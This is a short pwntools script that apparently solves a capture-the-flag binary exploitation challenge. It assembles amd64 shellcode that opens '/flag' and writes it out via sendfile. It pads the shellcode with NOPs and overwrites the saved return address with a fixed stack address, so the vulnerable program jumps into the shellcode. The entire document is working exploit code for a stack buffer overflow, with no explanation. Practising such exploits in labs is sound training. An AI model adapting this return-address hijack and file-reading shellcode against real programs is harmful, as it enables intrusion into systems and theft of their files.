from pwn import *

buffer_size = 0x38
buffer_address = 0x7fffffffd1f0

shellcode = asm("""
    lea     rdi, [rip+flag]
    xor     rsi, rsi
    xor     rdx, rdx
    push    2
    pop     rax
    syscall

    push    1
    pop     rdi
    xchg    rax, rsi
    xor     rdx, rdx
    push    0x40
    pop     r10
    push    SYS_sendfile
    pop     rax

    jmp     exit

.byte 0x00
.long 0x00

exit:

    syscall

    xchg    rax, rdi
    push    SYS_exit
    pop     rax
    syscall

flag:
.string "/flag"

""", arch='amd64', os='linux')


payload = shellcode + b'\x90'*(buffer_size - len(shellcode))
payload += p64(buffer_address)

io = process(['/challenge/binary-exploitation-hijack-to-shellcode'])

io.send(payload)
io.recvline_contains(b'Goodbye!')

print(io.readall().decode())
